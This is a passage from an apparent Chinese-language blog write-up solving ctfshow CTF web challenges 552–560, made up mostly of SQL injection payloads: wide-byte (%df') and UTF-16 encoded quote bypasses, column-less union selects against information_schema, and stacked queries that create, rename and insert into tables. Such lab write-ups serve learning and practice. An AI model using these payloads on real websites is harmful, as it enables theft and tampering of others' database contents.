+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs q">查库<br><br>?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata;%<span class="hljs-number">00</span><br>查表时没法用<span class="hljs-built_in">where</span> table_schema=&#x27;ctfshow&#x27;里面有&#x27;而且不知为何不能用宽字节注入<br><br>所以就查出所有的表<br><br>?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span>;%<span class="hljs-number">00</span><br>之后就是有库名有表名<br><br>进行无列名注入<br>?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> as b <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a;%<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-553-宽字节注入"><a href="#web-553-宽字节注入" class="headerlink" title="web-553 宽字节注入"></a>web-553 宽字节注入</h2><p>和上题一样就是不能用;%00进行闭合了可以改用–+</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span>%df%<span class="hljs-number">27</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>)a<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-554-POST宽字节注入"><a href="#web-554-POST宽字节注入" class="headerlink" title="web-554 POST宽字节注入"></a>web-554 POST宽字节注入</h2><p>因为会把%也给\了所以要在bp上操作</p>
+<p>国光大佬还写了一个新方法：</p>
+<p>将 utf-8 转换为 utf-16 或 utf-32，例如将 ‘ 转为 utf-16 为�，从而得到了一个能被utf-8解析<br>为汉字的字节。<br>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p>
+<p>➜ ~ echo ‘|iconv -f utf-8 -t utf-16<br>��’<br>➜ ~ echo ‘|iconv -f utf-8 -t utf-32<br>��’</p>
+<p>uname&#x3D;-1�’union select 1,(select group_concat(flag4s) from ctfshow.flags)–+&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p>
+<hr>
+<h2 id="web-555-无列名注入-id-0"><a href="#web-555-无列名注入-id-0" class="headerlink" title="web-555 无列名注入 id&#x3D;0"></a>web-555 无列名注入 id&#x3D;0</h2><p>数字型注入其他和上一题一样</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">因为<span class="hljs-string">&#x27;&#x27;</span>被加了\所以无法使用<span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctfshow&#x27;</span>，只能查所有表名<br>?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span>;<span class="hljs-comment">--+</span><br><br>列名一样<br><br>?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(b)<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags)a<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-556-同上"><a href="#web-556-同上" class="headerlink" title="web-556 同上"></a>web-556 同上</h2><p>和上面的题重复了</p>
+<p>?id&#x3D;0%df’ union select 1,2,group_concat(b)from (select 1,2 as b union select * from ctfshow.flags)a–+</p>
+<hr>
+<h2 id="web-557-POST宽字节注入、union无列名注入"><a href="#web-557-POST宽字节注入、union无列名注入" class="headerlink" title="web-557 POST宽字节注入、union无列名注入"></a>web-557 POST宽字节注入、union无列名注入</h2><p>bp post传</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">uname=admin%df&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(b)<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">as</span> b <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ctfshow.flags)a--+&amp;passwd=admin&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-558-堆叠注入"><a href="#web-558-堆叠注入" class="headerlink" title="web-558 堆叠注入"></a>web-558 堆叠注入</h2><p><strong>堆叠注入：</strong></p>
+<p>MySQL 的命令行中，每一条语句以 <code>;</code> 结尾，这代表语句的结束，如果在注入过程中在 <code>;</code> 后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。</p>
+<p>局限性</p>
+<ol>
+<li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li>
+<li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果只能被忽略</li>
+</ol>
+<p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">?id=<span class="hljs-number">1</span>&#x27;;CREATE TABLE <span class="hljs-keyword">flags</span> SELECT * FROM ctfshow.<span class="hljs-keyword">flags</span>;rename <span class="hljs-built_in">table</span> users <span class="hljs-keyword">to</span> a;rename <span class="hljs-built_in">table</span> <span class="hljs-keyword">flags</span> <span class="hljs-keyword">to</span> users;<br></code></pre></td></tr></table></figure>
+
+<p>创建一个名为”flags”的新表，通过选择来自”ctfshow”模式的”flags”表中的所有列和行。接下来，你尝试将名为”users”的表重命名为”a”，然后将名为”flags”的表重命名为”users”。</p>
+<p>再查询id&#x3D;1即可</p>
+<p>还有一种方法</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">77</span>,(<span class="hljs-keyword">select</span> group_concat(flag4s) <span class="hljs-keyword">from</span> ctfshow.flags),&quot;don77&quot;)<span class="hljs-comment">-- +</span><br></code></pre></td></tr></table></figure>
+
+<p>这个SQL查询是在尝试向<code>users</code>表中插入一行数据。具体来说，它试图将<code>id</code>设置为<code>77</code>，<code>username</code>设置为从<code>ctfshow.flags</code>表中的<code>flag4s</code>列获取的所有值连接在一起（使用<code>group_concat</code>函数），<code>password</code>设置为<code>&quot;don77&quot;</code>。</p>
+<p>但是直接插入数据，flag会写入字段里面数据库列长度不一定满足回显长度需求所以截取试试。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=-1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-number">77</span>,(<span class="hljs-keyword">select</span> SUBSTRING(group_concat(flag4s),<span class="hljs-number">1</span>,<span class="hljs-number">5</span>) <span class="hljs-keyword">from</span> ctfshow.flags),<span class="hljs-string">&quot;don77&quot;</span>)--+<br></code></pre></td></tr></table></figure>
+
+<p>联合注入也可以</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;闭合</span><br><span class="hljs-string">?id=0&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-559-堆叠注入-、id-1"><a href="#web-559-堆叠注入-、id-1" class="headerlink" title="web-559 堆叠注入 、id&#x3D;1"></a>web-559 堆叠注入 、id&#x3D;1</h2><p>堆叠注入</p>
+<p>参考558</p>
+<p>数字型</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> flags <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> ctfshow.flags;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> users <span class="hljs-keyword">to</span> a;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> flags <span class="hljs-keyword">to</span> users;<br><br>或:<br><br>?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-560-堆叠注入、id-1’"><a href="#web-560-堆叠注入、id-1’" class="headerlink" title="web-560 堆叠注入、id&#x3D;1’)"></a>web-560 堆叠注入、id&#x3D;1’)</h2><p>堆叠注入</p>
+<p>参考558</p>
+<p>‘)闭合</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27;);CREATE TABLE flags SELECT * <span class="hljs-keyword">FROM</span> ctfshow.flags;rename table<span class="hljs-built_in"> users </span><span class="hljs-keyword">to</span> a;rename table flags <span class="hljs-keyword">to</span><span class="hljs-built_in"> users;</span><br><span class="hljs-built_in"></span><br>或:<br><br>?<span class="hljs-attribute">id</span>=0&#x27;)union select 1,2,group_concat(flag4s)<span class="hljs-keyword">from</span> ctfshow.flags--+<br></code></pre></td></tr></table></figure>
+
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
